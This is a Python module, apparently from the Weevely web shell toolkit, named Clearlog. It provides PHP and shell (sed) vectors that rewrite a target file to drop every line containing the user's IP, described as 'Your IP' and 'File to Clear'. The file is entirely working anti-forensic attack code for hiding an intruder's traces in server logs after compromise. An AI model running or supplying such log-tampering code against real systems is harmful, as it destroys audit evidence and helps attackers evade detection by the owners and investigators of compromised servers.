from weevely.core.module import Module
from weevely.core.vectors import PhpCode
from weevely.core.vectors import ShellCmd


class Clearlog(Module):
    """Remove string from a file."""

    def init(self):
        self.register_info({"author": ["appo"], "license": "GPLv3"})

        self.register_vectors(
            [
                PhpCode(
                    """$fc=file("${file}");
                       $f=fopen("${file}","w");
                       foreach($fc as $line)
                       {
                         if (!strstr($line,"${ip}"))
                         fputs($f,$line);
                       }
                       fclose($f);""",
                    name="php_clear",
                ),
                ShellCmd("""sed -i /${ip}/d ${file}""", name="clearlog"),
                ShellCmd("""sed /${ip}/d ${file} > ${file}.$$ && /bin/mv ${file}.$$ ${file}""", name="old_school"),
            ]
        )

        self.register_arguments(
            [
                {"name": "ip", "help": "Your IP"},
                {"name": "file", "help": "File to Clear"},
                {"name": "-vector", "choices": self.vectors.get_names(), "default": "clearlog"},
            ]
        )

    def run(self, **kwargs):
        return self.vectors.get_result(name=self.args["vector"], format_args=self.args)
